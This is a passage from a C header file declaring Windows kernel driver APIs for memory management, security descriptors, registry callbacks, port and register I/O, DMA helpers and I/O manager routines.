NTKERNELAPI
VOID
NTAPI
MmFreeContiguousMemory(
  IN PVOID BaseAddress);

NTKERNELAPI
VOID
NTAPI
MmFreeContiguousMemorySpecifyCache(
  IN PVOID BaseAddress,
  IN SIZE_T NumberOfBytes,
  IN MEMORY_CACHING_TYPE CacheType);

NTKERNELAPI
VOID
NTAPI
MmFreePagesFromMdl(
  IN PMDLX MemoryDescriptorList);

NTKERNELAPI
PVOID
NTAPI
MmGetSystemRoutineAddress(
  IN PUNICODE_STRING SystemRoutineName);

NTKERNELAPI
LOGICAL
NTAPI
MmIsDriverVerifying(
  IN struct _DRIVER_OBJECT *DriverObject);

NTKERNELAPI
PVOID
NTAPI
MmLockPagableDataSection(
  IN PVOID AddressWithinSection);

NTKERNELAPI
PVOID
NTAPI
MmMapIoSpace(
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN SIZE_T NumberOfBytes,
  IN MEMORY_CACHING_TYPE CacheEnable);

NTKERNELAPI
PVOID
NTAPI
MmMapLockedPages(
  IN PMDL MemoryDescriptorList,
  IN KPROCESSOR_MODE AccessMode);

NTKERNELAPI
PVOID
NTAPI
MmMapLockedPagesSpecifyCache(
  IN PMDLX MemoryDescriptorList,
  IN KPROCESSOR_MODE AccessMode,
  IN MEMORY_CACHING_TYPE CacheType,
  IN PVOID BaseAddress OPTIONAL,
  IN ULONG BugCheckOnFailure,
  IN MM_PAGE_PRIORITY Priority);

NTKERNELAPI
PVOID
NTAPI
MmPageEntireDriver(
  IN PVOID AddressWithinSection);

NTKERNELAPI
VOID
NTAPI
MmProbeAndLockPages(
  IN OUT PMDL MemoryDescriptorList,
  IN KPROCESSOR_MODE AccessMode,
  IN LOCK_OPERATION Operation);

NTKERNELAPI
MM_SYSTEMSIZE
NTAPI
MmQuerySystemSize(VOID);

NTKERNELAPI
VOID
NTAPI
MmResetDriverPaging(
  IN PVOID AddressWithinSection);

NTKERNELAPI
SIZE_T
NTAPI
MmSizeOfMdl(
  IN PVOID Base,
  IN SIZE_T Length);

NTKERNELAPI
VOID
NTAPI
MmUnlockPagableImageSection(
  IN PVOID ImageSectionHandle);

NTKERNELAPI
VOID
NTAPI
MmUnlockPages(
  IN OUT PMDL MemoryDescriptorList);

NTKERNELAPI
VOID
NTAPI
MmUnmapIoSpace(
  IN PVOID BaseAddress,
  IN SIZE_T NumberOfBytes);

NTKERNELAPI
VOID
NTAPI
MmProbeAndLockProcessPages(
  IN OUT PMDL MemoryDescriptorList,
  IN PEPROCESS Process,
  IN KPROCESSOR_MODE AccessMode,
  IN LOCK_OPERATION Operation);

NTKERNELAPI
VOID
NTAPI
MmUnmapLockedPages(
  IN PVOID BaseAddress,
  IN PMDL MemoryDescriptorList);

NTKERNELAPI
PVOID
NTAPI
MmAllocateContiguousMemorySpecifyCacheNode(
  IN SIZE_T NumberOfBytes,
  IN PHYSICAL_ADDRESS LowestAcceptableAddress,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress,
  IN PHYSICAL_ADDRESS BoundaryAddressMultiple OPTIONAL,
  IN MEMORY_CACHING_TYPE CacheType,
  IN NODE_REQUIREMENT PreferredNode);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
NTSTATUS
NTAPI
MmAdvanceMdl(
  IN OUT PMDL Mdl,
  IN ULONG NumberOfBytes);

NTKERNELAPI
PVOID
NTAPI
MmAllocateMappingAddress(
  IN SIZE_T NumberOfBytes,
  IN ULONG PoolTag);

NTKERNELAPI
VOID
NTAPI
MmFreeMappingAddress(
  IN PVOID BaseAddress,
  IN ULONG PoolTag);

NTKERNELAPI
NTSTATUS
NTAPI
MmIsVerifierEnabled(
  OUT PULONG VerifierFlags);

NTKERNELAPI
PVOID
NTAPI
MmMapLockedPagesWithReservedMapping(
  IN PVOID MappingAddress,
  IN ULONG PoolTag,
  IN PMDL MemoryDescriptorList,
  IN MEMORY_CACHING_TYPE CacheType);

NTKERNELAPI
NTSTATUS
NTAPI
MmProtectMdlSystemAddress(
  IN PMDL MemoryDescriptorList,
  IN ULONG NewProtect);

NTKERNELAPI
VOID
NTAPI
MmUnmapReservedMapping(
  IN PVOID BaseAddress,
  IN ULONG PoolTag,
  IN PMDL MemoryDescriptorList);

NTKERNELAPI
NTSTATUS
NTAPI
MmAddVerifierThunks(
  IN PVOID ThunkBuffer,
  IN ULONG ThunkBufferSize);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)
NTKERNELAPI
LOGICAL
NTAPI
MmIsIoSpaceActive(
  IN PHYSICAL_ADDRESS StartAddress,
  IN SIZE_T NumberOfBytes);

#endif /* (NTDDI_VERSION >= NTDDI_WS03) */
#if (NTDDI_VERSION >= NTDDI_WS03SP1)
NTKERNELAPI
PMDL
NTAPI
MmAllocatePagesForMdlEx(
  IN PHYSICAL_ADDRESS LowAddress,
  IN PHYSICAL_ADDRESS HighAddress,
  IN PHYSICAL_ADDRESS SkipBytes,
  IN SIZE_T TotalBytes,
  IN MEMORY_CACHING_TYPE CacheType,
  IN ULONG Flags);
#endif

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
LOGICAL
NTAPI
MmIsDriverVerifyingByAddress(
  IN PVOID AddressWithinSection);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

/******************************************************************************
 *                            Security Manager Functions                      *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTKERNELAPI
BOOLEAN
NTAPI
SeAccessCheck(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSECURITY_SUBJECT_CONTEXT SubjectSecurityContext,
  IN BOOLEAN SubjectContextLocked,
  IN ACCESS_MASK DesiredAccess,
  IN ACCESS_MASK PreviouslyGrantedAccess,
  OUT PPRIVILEGE_SET *Privileges OPTIONAL,
  IN PGENERIC_MAPPING GenericMapping,
  IN KPROCESSOR_MODE AccessMode,
  OUT PACCESS_MASK GrantedAccess,
  OUT PNTSTATUS AccessStatus);

NTKERNELAPI
NTSTATUS
NTAPI
SeAssignSecurity(
  IN PSECURITY_DESCRIPTOR ParentDescriptor OPTIONAL,
  IN PSECURITY_DESCRIPTOR ExplicitDescriptor OPTIONAL,
  OUT PSECURITY_DESCRIPTOR *NewDescriptor,
  IN BOOLEAN IsDirectoryObject,
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext,
  IN PGENERIC_MAPPING GenericMapping,
  IN POOL_TYPE PoolType);

NTKERNELAPI
NTSTATUS
NTAPI
SeAssignSecurityEx(
  IN PSECURITY_DESCRIPTOR ParentDescriptor OPTIONAL,
  IN PSECURITY_DESCRIPTOR ExplicitDescriptor OPTIONAL,
  OUT PSECURITY_DESCRIPTOR *NewDescriptor,
  IN GUID *ObjectType OPTIONAL,
  IN BOOLEAN IsDirectoryObject,
  IN ULONG AutoInheritFlags,
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext,
  IN PGENERIC_MAPPING GenericMapping,
  IN POOL_TYPE PoolType);

NTKERNELAPI
NTSTATUS
NTAPI
SeDeassignSecurity(
  IN OUT PSECURITY_DESCRIPTOR *SecurityDescriptor);

NTKERNELAPI
BOOLEAN
NTAPI
SeValidSecurityDescriptor(
  IN ULONG Length,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTKERNELAPI
ULONG
NTAPI
SeObjectCreateSaclAccessBits(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTKERNELAPI
VOID
NTAPI
SeReleaseSubjectContext(
  IN OUT PSECURITY_SUBJECT_CONTEXT SubjectContext);

NTKERNELAPI
VOID
NTAPI
SeUnlockSubjectContext(
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext);

NTKERNELAPI
VOID
NTAPI
SeCaptureSubjectContext(
  OUT PSECURITY_SUBJECT_CONTEXT SubjectContext);

NTKERNELAPI
VOID
NTAPI
SeLockSubjectContext(
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WS03SP1)

NTSTATUS
NTAPI
SeSetAuditParameter(
  IN OUT PSE_ADT_PARAMETER_ARRAY AuditParameters,
  IN SE_ADT_PARAMETER_TYPE Type,
  IN ULONG Index,
  IN PVOID Data);

NTSTATUS
NTAPI
SeReportSecurityEvent(
  IN ULONG Flags,
  IN PUNICODE_STRING SourceName,
  IN PSID UserSid OPTIONAL,
  IN PSE_ADT_PARAMETER_ARRAY AuditParameters);

#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
ULONG
NTAPI
SeComputeAutoInheritByObjectType(
  IN PVOID ObjectType,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
  IN PSECURITY_DESCRIPTOR ParentSecurityDescriptor OPTIONAL);

#ifdef SE_NTFS_WORLD_CACHE
VOID
NTAPI
SeGetWorldRights(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PGENERIC_MAPPING GenericMapping,
  OUT PACCESS_MASK GrantedAccess);
#endif /* SE_NTFS_WORLD_CACHE */
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

/******************************************************************************
 *                         Configuration Manager Functions                    *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
NTSTATUS
NTAPI
CmRegisterCallback(
  IN PEX_CALLBACK_FUNCTION Function,
  IN PVOID Context OPTIONAL,
  OUT PLARGE_INTEGER Cookie);

NTKERNELAPI
NTSTATUS
NTAPI
CmUnRegisterCallback(
  IN LARGE_INTEGER Cookie);
#endif

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
NTSTATUS
NTAPI
CmRegisterCallbackEx(
  PEX_CALLBACK_FUNCTION Function,
  PCUNICODE_STRING Altitude,
  PVOID Driver,
  PVOID Context,
  PLARGE_INTEGER Cookie,
  PVOID Reserved);

NTKERNELAPI
VOID
NTAPI
CmGetCallbackVersion(
  OUT PULONG Major OPTIONAL,
  OUT PULONG Minor OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
CmSetCallbackObjectContext(
  IN OUT PVOID Object,
  IN PLARGE_INTEGER Cookie,
  IN PVOID NewContext,
  OUT PVOID *OldContext OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
CmCallbackGetKeyObjectID(
  IN PLARGE_INTEGER Cookie,
  IN PVOID Object,
  OUT PULONG_PTR ObjectID OPTIONAL,
  OUT PCUNICODE_STRING *ObjectName OPTIONAL);

NTKERNELAPI
PVOID
NTAPI
CmGetBoundTransaction(
  IN PLARGE_INTEGER Cookie,
  IN PVOID Object);

#endif // NTDDI_VERSION >= NTDDI_VISTA


/******************************************************************************
 *                         I/O Manager Functions                              *
 ******************************************************************************/

/*
 * NTSTATUS
 * IoAcquireRemoveLock(
 *   IN PIO_REMOVE_LOCK  RemoveLock,
 *   IN OPTIONAL PVOID  Tag)
 */
#if DBG
#define IoAcquireRemoveLock(RemoveLock, Tag) \
  IoAcquireRemoveLockEx(RemoveLock, Tag, __FILE__, __LINE__, sizeof (IO_REMOVE_LOCK))
#else
#define IoAcquireRemoveLock(RemoveLock, Tag) \
  IoAcquireRemoveLockEx(RemoveLock, Tag, "", 1, sizeof (IO_REMOVE_LOCK))
#endif

/*
 * VOID
 * IoAdjustPagingPathCount(
 *   IN PLONG  Count,
 *   IN BOOLEAN  Increment)
 */
#define IoAdjustPagingPathCount(_Count, \
                                _Increment) \
{ \
  if (_Increment) \
    { \
      InterlockedIncrement(_Count); \
    } \
  else \
    { \
      InterlockedDecrement(_Count); \
    } \
}

#if !defined(_M_AMD64)
NTHALAPI
VOID
NTAPI
READ_PORT_BUFFER_UCHAR(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count);

NTHALAPI
VOID
NTAPI
READ_PORT_BUFFER_ULONG(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count);

NTHALAPI
VOID
NTAPI
READ_PORT_BUFFER_USHORT(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count);

NTHALAPI
UCHAR
NTAPI
READ_PORT_UCHAR(
  IN PUCHAR Port);

NTHALAPI
ULONG
NTAPI
READ_PORT_ULONG(
  IN PULONG Port);

NTHALAPI
USHORT
NTAPI
READ_PORT_USHORT(
  IN PUSHORT Port);

NTKERNELAPI
VOID
NTAPI
READ_REGISTER_BUFFER_UCHAR(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count);

NTKERNELAPI
VOID
NTAPI
READ_REGISTER_BUFFER_ULONG(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count);

NTKERNELAPI
VOID
NTAPI
READ_REGISTER_BUFFER_USHORT(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count);

NTKERNELAPI
UCHAR
NTAPI
READ_REGISTER_UCHAR(
  IN PUCHAR Register);

NTKERNELAPI
ULONG
NTAPI
READ_REGISTER_ULONG(
  IN PULONG Register);

NTKERNELAPI
USHORT
NTAPI
READ_REGISTER_USHORT(
  IN PUSHORT Register);

NTHALAPI
VOID
NTAPI
WRITE_PORT_BUFFER_UCHAR(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count);

NTHALAPI
VOID
NTAPI
WRITE_PORT_BUFFER_ULONG(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count);

NTHALAPI
VOID
NTAPI
WRITE_PORT_BUFFER_USHORT(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count);

NTHALAPI
VOID
NTAPI
WRITE_PORT_UCHAR(
  IN PUCHAR Port,
  IN UCHAR Value);

NTHALAPI
VOID
NTAPI
WRITE_PORT_ULONG(
  IN PULONG Port,
  IN ULONG Value);

NTHALAPI
VOID
NTAPI
WRITE_PORT_USHORT(
  IN PUSHORT Port,
  IN USHORT Value);

NTKERNELAPI
VOID
NTAPI
WRITE_REGISTER_BUFFER_UCHAR(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count);

NTKERNELAPI
VOID
NTAPI
WRITE_REGISTER_BUFFER_ULONG(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count);

NTKERNELAPI
VOID
NTAPI
WRITE_REGISTER_BUFFER_USHORT(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count);

NTKERNELAPI
VOID
NTAPI
WRITE_REGISTER_UCHAR(
  IN PUCHAR Register,
  IN UCHAR Value);

NTKERNELAPI
VOID
NTAPI
WRITE_REGISTER_ULONG(
  IN PULONG Register,
  IN ULONG Value);

NTKERNELAPI
VOID
NTAPI
WRITE_REGISTER_USHORT(
  IN PUSHORT Register,
  IN USHORT Value);

#else

FORCEINLINE
VOID
READ_PORT_BUFFER_UCHAR(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count)
{
  __inbytestring((USHORT)(ULONG_PTR)Port, Buffer, Count);
}

FORCEINLINE
VOID
READ_PORT_BUFFER_ULONG(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count)
{
  __indwordstring((USHORT)(ULONG_PTR)Port, Buffer, Count);
}

FORCEINLINE
VOID
READ_PORT_BUFFER_USHORT(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count)
{
  __inwordstring((USHORT)(ULONG_PTR)Port, Buffer, Count);
}

FORCEINLINE
UCHAR
READ_PORT_UCHAR(
  IN PUCHAR Port)
{
  return __inbyte((USHORT)(ULONG_PTR)Port);
}

FORCEINLINE
ULONG
READ_PORT_ULONG(
  IN PULONG Port)
{
  return __indword((USHORT)(ULONG_PTR)Port);
}

FORCEINLINE
USHORT
READ_PORT_USHORT(
  IN PUSHORT Port)
{
  return __inword((USHORT)(ULONG_PTR)Port);
}

FORCEINLINE
VOID
READ_REGISTER_BUFFER_UCHAR(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count)
{
  __movsb(Register, Buffer, Count);
}

FORCEINLINE
VOID
READ_REGISTER_BUFFER_ULONG(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count)
{
  __movsd(Register, Buffer, Count);
}

FORCEINLINE
VOID
READ_REGISTER_BUFFER_USHORT(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count)
{
  __movsw(Register, Buffer, Count);
}

FORCEINLINE
UCHAR
READ_REGISTER_UCHAR(
  IN volatile UCHAR *Register)
{
  return *Register;
}

FORCEINLINE
ULONG
READ_REGISTER_ULONG(
  IN volatile ULONG *Register)
{
  return *Register;
}

FORCEINLINE
USHORT
READ_REGISTER_USHORT(
  IN volatile USHORT *Register)
{
  return *Register;
}

FORCEINLINE
VOID
WRITE_PORT_BUFFER_UCHAR(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count)
{
  __outbytestring((USHORT)(ULONG_PTR)Port, Buffer, Count);
}

FORCEINLINE
VOID
WRITE_PORT_BUFFER_ULONG(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count)
{
  __outdwordstring((USHORT)(ULONG_PTR)Port, Buffer, Count);
}

FORCEINLINE
VOID
WRITE_PORT_BUFFER_USHORT(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count)
{
  __outwordstring((USHORT)(ULONG_PTR)Port, Buffer, Count);
}

FORCEINLINE
VOID
WRITE_PORT_UCHAR(
  IN PUCHAR Port,
  IN UCHAR Value)
{
  __outbyte((USHORT)(ULONG_PTR)Port, Value);
}

FORCEINLINE
VOID
WRITE_PORT_ULONG(
  IN PULONG Port,
  IN ULONG Value)
{
  __outdword((USHORT)(ULONG_PTR)Port, Value);
}

FORCEINLINE
VOID
WRITE_PORT_USHORT(
  IN PUSHORT Port,
  IN USHORT Value)
{
  __outword((USHORT)(ULONG_PTR)Port, Value);
}

FORCEINLINE
VOID
WRITE_REGISTER_BUFFER_UCHAR(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count)
{
  LONG Synch;
  __movsb(Register, Buffer, Count);
  InterlockedOr(&Synch, 1);
}

FORCEINLINE
VOID
WRITE_REGISTER_BUFFER_ULONG(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count)
{
  LONG Synch;
  __movsd(Register, Buffer, Count);
  InterlockedOr(&Synch, 1);
}

FORCEINLINE
VOID
WRITE_REGISTER_BUFFER_USHORT(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count)
{
  LONG Synch;
  __movsw(Register, Buffer, Count);
  InterlockedOr(&Synch, 1);
}

FORCEINLINE
VOID
WRITE_REGISTER_UCHAR(
  IN volatile UCHAR *Register,
  IN UCHAR Value)
{
  LONG Synch;
  *Register = Value;
  InterlockedOr(&Synch, 1);
}

FORCEINLINE
VOID
WRITE_REGISTER_ULONG(
  IN volatile ULONG *Register,
  IN ULONG Value)
{
  LONG Synch;
  *Register = Value;
  InterlockedOr(&Synch, 1);
}

FORCEINLINE
VOID
WRITE_REGISTER_USHORT(
  IN volatile USHORT *Register,
  IN USHORT Value)
{
  LONG Sync;
  *Register = Value;
  InterlockedOr(&Sync, 1);
}
#endif

#if defined(USE_DMA_MACROS) && !defined(_NTHAL_) && \
   (defined(_NTDDK_) || defined(_NTDRIVER_)) || defined(_WDM_INCLUDED_)

#define DMA_MACROS_DEFINED

FORCEINLINE
NTSTATUS
IoAllocateAdapterChannel(
  IN PDMA_ADAPTER DmaAdapter,
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG NumberOfMapRegisters,
  IN PDRIVER_CONTROL ExecutionRoutine,
  IN PVOID Context)
{
  PALLOCATE_ADAPTER_CHANNEL AllocateAdapterChannel;
  AllocateAdapterChannel =
      *(DmaAdapter)->DmaOperations->AllocateAdapterChannel;
  ASSERT(AllocateAdapterChannel);
  return AllocateAdapterChannel(DmaAdapter,
                                DeviceObject,
                                NumberOfMapRegisters,
                                ExecutionRoutine,
                                Context );
}

FORCEINLINE
BOOLEAN
NTAPI
IoFlushAdapterBuffers(
  IN PDMA_ADAPTER DmaAdapter,
  IN PMDL Mdl,
  IN PVOID MapRegisterBase,
  IN PVOID CurrentVa,
  IN ULONG Length,
  IN BOOLEAN WriteToDevice)
{
  PFLUSH_ADAPTER_BUFFERS FlushAdapterBuffers;
  FlushAdapterBuffers = *(DmaAdapter)->DmaOperations->FlushAdapterBuffers;
  ASSERT(FlushAdapterBuffers);
  return FlushAdapterBuffers(DmaAdapter,
                             Mdl,
                             MapRegisterBase,
                             CurrentVa,
                             Length,
                             WriteToDevice);
}

FORCEINLINE
VOID
NTAPI
IoFreeAdapterChannel(
  IN PDMA_ADAPTER DmaAdapter)
{
  PFREE_ADAPTER_CHANNEL FreeAdapterChannel;
  FreeAdapterChannel = *(DmaAdapter)->DmaOperations->FreeAdapterChannel;
  ASSERT(FreeAdapterChannel);
  FreeAdapterChannel(DmaAdapter);
}

FORCEINLINE
VOID
NTAPI
IoFreeMapRegisters(
  IN PDMA_ADAPTER DmaAdapter,
  IN PVOID MapRegisterBase,
  IN ULONG NumberOfMapRegisters)
{
  PFREE_MAP_REGISTERS FreeMapRegisters;
  FreeMapRegisters = *(DmaAdapter)->DmaOperations->FreeMapRegisters;
  ASSERT(FreeMapRegisters);
  FreeMapRegisters(DmaAdapter, MapRegisterBase, NumberOfMapRegisters);
}

FORCEINLINE
PHYSICAL_ADDRESS
NTAPI
IoMapTransfer(
  IN PDMA_ADAPTER DmaAdapter,
  IN PMDL Mdl,
  IN PVOID MapRegisterBase,
  IN PVOID CurrentVa,
  IN OUT PULONG Length,
  IN BOOLEAN WriteToDevice)
{
  PMAP_TRANSFER MapTransfer;

  MapTransfer = *(DmaAdapter)->DmaOperations->MapTransfer;
  ASSERT(MapTransfer);
  return MapTransfer(DmaAdapter,
                     Mdl,
                     MapRegisterBase,
                     CurrentVa,
                     Length,
                     WriteToDevice);
}
#endif

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
VOID
NTAPI
IoAcquireCancelSpinLock(
  OUT PKIRQL Irql);

NTKERNELAPI
NTSTATUS
NTAPI
IoAcquireRemoveLockEx(
  IN PIO_REMOVE_LOCK RemoveLock,
  IN PVOID Tag OPTIONAL,
  IN PCSTR File,
  IN ULONG Line,
  IN ULONG RemlockSize);
NTKERNELAPI
NTSTATUS
NTAPI
IoAllocateDriverObjectExtension(
  IN PDRIVER_OBJECT DriverObject,
  IN PVOID ClientIdentificationAddress,
  IN ULONG DriverObjectExtensionSize,
  OUT PVOID *DriverObjectExtension);

NTKERNELAPI
PVOID
NTAPI
IoAllocateErrorLogEntry(
  IN PVOID IoObject,
  IN UCHAR EntrySize);

NTKERNELAPI
PIRP
NTAPI
IoAllocateIrp(
  IN CCHAR StackSize,
  IN BOOLEAN ChargeQuota);

NTKERNELAPI
PMDL
NTAPI
IoAllocateMdl(
  IN PVOID VirtualAddress OPTIONAL,
  IN ULONG Length,
  IN BOOLEAN SecondaryBuffer,
  IN BOOLEAN ChargeQuota,
  IN OUT PIRP Irp OPTIONAL);

NTKERNELAPI
PIO_WORKITEM
NTAPI
IoAllocateWorkItem(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoAttachDevice(
  IN PDEVICE_OBJECT SourceDevice,
  IN PUNICODE_STRING TargetDevice,
  OUT PDEVICE_OBJECT *AttachedDevice);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoAttachDeviceToDeviceStack(
  IN PDEVICE_OBJECT SourceDevice,
  IN PDEVICE_OBJECT TargetDevice);

NTKERNELAPI
PIRP
NTAPI
IoBuildAsynchronousFsdRequest(
  IN ULONG MajorFunction,
  IN PDEVICE_OBJECT DeviceObject,
  IN OUT PVOID Buffer OPTIONAL,
  IN ULONG Length OPTIONAL,
  IN PLARGE_INTEGER StartingOffset OPTIONAL,
  IN PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);

NTKERNELAPI
PIRP
NTAPI
IoBuildDeviceIoControlRequest(
  IN ULONG IoControlCode,
  IN PDEVICE_OBJECT DeviceObject,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength,
  IN BOOLEAN InternalDeviceIoControl,
  IN PKEVENT Event,
  OUT PIO_STATUS_BLOCK IoStatusBlock);

NTKERNELAPI
VOID
NTAPI
IoBuildPartialMdl(
  IN PMDL SourceMdl,
  IN OUT PMDL TargetMdl,
  IN PVOID VirtualAddress,
  IN ULONG Length);

NTKERNELAPI
PIRP
NTAPI
IoBuildSynchronousFsdRequest(
  IN ULONG MajorFunction,
  IN PDEVICE_OBJECT DeviceObject,
  IN OUT PVOID Buffer OPTIONAL,
  IN ULONG Length OPTIONAL,
  IN PLARGE_INTEGER StartingOffset OPTIONAL,
  IN PKEVENT Event,
  OUT PIO_STATUS_BLOCK IoStatusBlock);

NTKERNELAPI
NTSTATUS
FASTCALL
IofCallDriver(
  IN PDEVICE_OBJECT DeviceObject,
  IN OUT PIRP Irp);
#define IoCallDriver IofCallDriver

NTKERNELAPI
VOID
FASTCALL
IofCompleteRequest(
  IN PIRP Irp,
  IN CCHAR PriorityBoost);
#define IoCompleteRequest IofCompleteRequest

NTKERNELAPI
BOOLEAN
NTAPI
IoCancelIrp(
  IN PIRP Irp);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckShareAccess(
  IN ACCESS_MASK DesiredAccess,
  IN ULONG DesiredShareAccess,
  IN OUT PFILE_OBJECT FileObject,
  IN OUT PSHARE_ACCESS ShareAccess,
  IN BOOLEAN Update);

NTKERNELAPI
VOID
FASTCALL
IofCompleteRequest(
  IN PIRP Irp,
  IN CCHAR PriorityBoost);

NTKERNELAPI
NTSTATUS
NTAPI
IoConnectInterrupt(
  OUT PKINTERRUPT *InterruptObject,
  IN PKSERVICE_ROUTINE ServiceRoutine,
  IN PVOID ServiceContext OPTIONAL,
  IN PKSPIN_LOCK SpinLock OPTIONAL,
  IN ULONG Vector,
  IN KIRQL Irql,
  IN KIRQL SynchronizeIrql,
  IN KINTERRUPT_MODE InterruptMode,
  IN BOOLEAN ShareVector,
  IN KAFFINITY ProcessorEnableMask,
  IN BOOLEAN FloatingSave);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateDevice(
  IN PDRIVER_OBJECT DriverObject,
  IN ULONG DeviceExtensionSize,
  IN PUNICODE_STRING DeviceName OPTIONAL,
  IN DEVICE_TYPE DeviceType,
  IN ULONG DeviceCharacteristics,
  IN BOOLEAN Exclusive,
  OUT PDEVICE_OBJECT *DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateFile(
  OUT PHANDLE FileHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER AllocationSize OPTIONAL,
  IN ULONG FileAttributes,
  IN ULONG ShareAccess,
  IN ULONG Disposition,
  IN ULONG CreateOptions,
  IN PVOID EaBuffer OPTIONAL,
  IN ULONG EaLength,
  IN CREATE_FILE_TYPE CreateFileType,
  IN PVOID InternalParameters OPTIONAL,
  IN ULONG Options);

NTKERNELAPI
PKEVENT
NTAPI
IoCreateNotificationEvent(
  IN PUNICODE_STRING EventName,
  OUT PHANDLE EventHandle);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateSymbolicLink(
  IN PUNICODE_STRING SymbolicLinkName,
  IN PUNICODE_STRING DeviceName);

NTKERNELAPI
PKEVENT
NTAPI
IoCreateSynchronizationEvent(
  IN PUNICODE_STRING EventName,
  OUT PHANDLE EventHandle);

NTKERNELAPI
NTSTATUS
NTAPI
IoCreateUnprotectedSymbolicLink(
  IN PUNICODE_STRING SymbolicLinkName,
  IN PUNICODE_STRING DeviceName);

NTKERNELAPI
VOID
NTAPI
IoDeleteDevice(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoDeleteSymbolicLink(
  IN PUNICODE_STRING SymbolicLinkName);

NTKERNELAPI
VOID
NTAPI
IoDetachDevice(
  IN OUT PDEVICE_OBJECT TargetDevice);

NTKERNELAPI
VOID
NTAPI
IoDisconnectInterrupt(
  IN PKINTERRUPT InterruptObject);

NTKERNELAPI
VOID
NTAPI
IoFreeIrp(
  IN PIRP Irp);

NTKERNELAPI
VOID
NTAPI
IoFreeMdl(
  IN PMDL Mdl);

NTKERNELAPI
VOID
NTAPI
IoFreeWorkItem(
  IN PIO_WORKITEM IoWorkItem);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetAttachedDevice(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetAttachedDeviceReference(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetBootDiskInformation(
  IN OUT PBOOTDISK_INFORMATION BootDiskInformation,
  IN ULONG Size);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDeviceInterfaceAlias(
  IN PUNICODE_STRING SymbolicLinkName,
  IN CONST GUID *AliasInterfaceClassGuid,
  OUT PUNICODE_STRING AliasSymbolicLinkName);

NTKERNELAPI
PEPROCESS
NTAPI
IoGetCurrentProcess(VOID);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDeviceInterfaces(
  IN CONST GUID *InterfaceClassGuid,
  IN PDEVICE_OBJECT PhysicalDeviceObject OPTIONAL,
  IN ULONG Flags,
